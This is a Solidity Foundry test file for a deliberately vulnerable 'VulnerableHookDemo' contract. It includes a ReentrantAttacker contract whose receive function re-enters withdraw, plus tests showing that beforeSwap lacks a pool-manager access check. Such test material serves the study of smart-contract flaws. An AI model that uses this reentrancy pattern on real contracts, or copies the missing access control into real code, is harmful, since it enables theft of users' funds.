// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/VulnerableHookDemo.sol";

contract ReentrantAttacker {
    VulnerableHookDemo public target;
    bool internal attacked;

    constructor(address _target) {
        target = VulnerableHookDemo(payable(_target));
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            target.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Need 1 ether");
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
    }
}

contract VulnerableHookDemoTest is Test {
    VulnerableHookDemo hook;
    ReentrantAttacker attacker;

    address user = address(200);

    function setUp() public {
        hook = new VulnerableHookDemo();
        attacker = new ReentrantAttacker(address(hook));

        vm.deal(user, 10 ether);
        vm.deal(address(attacker), 1 ether);

        vm.prank(user);
        hook.deposit{value: 5 ether}();
    }

    function testRegularDepositWorks() public {
        vm.prank(user);
        hook.deposit{value: 1 ether}();

        assertEq(hook.balances(user), 6 ether);
    }

    function testBeforeSwapHasNoPoolManagerRestriction() public {
        vm.prank(user);
        bytes4 result = hook.beforeSwap(address(1), bytes("abc"));
        assertEq(result, hook.beforeSwap.selector);
    }

    function testReentrancyAttackCausesBrokenExecution() public {
        vm.expectRevert();
        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();
    }
}
